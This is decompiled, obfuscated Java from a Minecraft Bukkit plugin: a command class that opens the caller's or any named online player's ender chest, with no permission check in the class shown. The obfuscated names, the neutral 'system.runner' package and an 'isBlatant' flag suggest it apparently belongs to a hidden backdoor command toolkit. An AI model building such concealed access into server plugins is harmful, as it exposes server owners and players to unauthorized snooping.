/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import java.util.concurrent.ExecutionException;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class EnderchestCommand
extends Command {
    public EnderchestCommand() {
        EnderchestCommand llllllllllllllIlIIIIIIlIIlIlIllI;
    }

    @Override
    public void execute(Core llllllllllllllIlIIIIIIlIIlIIlllI, String llllllllllllllIlIIIIIIlIIlIIllIl, String[] llllllllllllllIlIIIIIIlIIlIIllII, Player llllllllllllllIlIIIIIIlIIlIIlIll) {
        if (llllllllllllllIlIIIIIIlIIlIIllII.length <= 1) {
            llllllllllllllIlIIIIIIlIIlIIlllI.getServer().getScheduler().runTaskAsynchronously((Plugin)llllllllllllllIlIIIIIIlIIlIIlllI, () -> {
                try {
                    Bukkit.getScheduler().callSyncMethod((Plugin)llllllllllllllIlIIIIIIlIIlIIlllI, () -> llllllllllllllIlIIIIIIlIIlIIlIll.openInventory(llllllllllllllIlIIIIIIlIIlIIlIll.getEnderChest())).get();
                }
                catch (InterruptedException | ExecutionException llllllllllllllIlIIIIIIlIIIlIllIl) {
                    // empty catch block
                }
            });
            llllllllllllllIlIIIIIIlIIlIIlIll.sendMessage(Settings.PREFIX("You are now viewing your ender chest"));
        } else {
            Player llllllllllllllIlIIIIIIlIIlIlIIII = Bukkit.getServer().getPlayer(llllllllllllllIlIIIIIIlIIlIIllII[1]);
            if (llllllllllllllIlIIIIIIlIIlIlIIII == null) {
                llllllllllllllIlIIIIIIlIIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIlIIIIIIlIIlIIllII[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                llllllllllllllIlIIIIIIlIIlIIlllI.getServer().getScheduler().runTaskAsynchronously((Plugin)llllllllllllllIlIIIIIIlIIlIIlllI, () -> {
                    try {
                        Bukkit.getScheduler().callSyncMethod((Plugin)llllllllllllllIlIIIIIIlIIlIIlllI, () -> llllllllllllllIlIIIIIIlIIlIIlIll.openInventory(llllllllllllllIlIIIIIIlIIlIlIIII.getEnderChest())).get();
                    }
                    catch (InterruptedException | ExecutionException llllllllllllllIlIIIIIIlIIIlllIll) {
                        // empty catch block
                    }
                });
                llllllllllllllIlIIIIIIlIIlIIlIll.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You are now viewing ").append(Settings.RED).append(llllllllllllllIlIIIIIIlIIlIlIIII.getName()).append("'s").append(Settings.WHITE).append(" Ender Chest."))));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

